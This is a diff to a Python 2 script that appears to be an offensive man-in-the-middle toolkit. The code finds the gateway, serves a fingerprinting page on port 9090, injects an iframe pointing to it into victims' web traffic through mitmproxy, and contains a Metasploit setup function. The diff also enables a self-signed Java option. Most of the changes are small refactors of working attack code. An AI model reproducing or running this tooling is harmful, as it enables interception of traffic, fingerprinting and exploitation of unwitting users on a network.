@@ -4,7 +4,7 @@ from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
 import string,cgi,time,urlparse,commands,os,subprocess
 from os import curdir, sep
 
-javaSelfsigned=False
+javaSelfsigned=True
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -52,9 +52,7 @@ class bcolors:
     FAIL = '\033[91m'
     ENDC = '\033[0m'
 
-def getIP():
-    cmd = "route -n | grep 'UG' | awk '{print $8}'"
-    iface = commands.getstatusoutput(cmd)[1]
+def getIP(iface):
     cmd = "ifconfig "+iface+" | grep 'inet ' | awk '{print $2}' | cut -d':' -f 2"
     ipAddr = commands.getstatusoutput(cmd)[1]
     return ipAddr
@@ -62,7 +60,7 @@ def getIP():
 def modifyHTML(filename):
     content = []
     
-    ipAddr = getIP()
+    ipAddr = getIP('eth0')
     with open(filename) as f:
     	for line in f:
 		if '$.get(' in line:
@@ -92,12 +90,15 @@ def startMITMproxy():
 	cmd = 'screen -dmS mitm'
 	subprocess.Popen(cmd, shell=True)
 	cmdStr = 'cd '+os.getcwd()
+	print cmdStr
 	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
 	subprocess.Popen(cmd, shell=True)
-        ipAddr = getIP()
+        ipAddr = getIP('eth0')
 	cmdStr = 'python iframe_injector http://'+ipAddr+':9090/fingerprint.html'
 	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
+	print cmdStr
 	subprocess.Popen(cmd, shell=True)
+	print 
 	#cmd = 'screen  -S hello  -X stuff "ping 4.2.2.2^m"
 
 def setupMetasploit():
@@ -111,7 +112,8 @@ def main():
     try:
 	#Get Gateway
 	cmd = "route -n | awk '$2 ~/[1-9]+/ {print $2;}'"
-	gatewayIP = commands.getstatusoutput(cmd)[1]
+	gatewayIPList = commands.getstatusoutput(cmd)[1]
+	gatewayIP = gatewayIPList.split("\n")[0]
         server = ThreadedHTTPServer(('', 9090), Handler)
         print 'Started httpserver...'
 	startMITMproxy()
@@ -122,7 +124,7 @@ def main():
     except KeyboardInterrupt:
         print '^C received, shutting down server'
 	cmd = "killall screen"
-	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
+	#subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
         server.socket.close()
 
 if __name__ == '__main__':
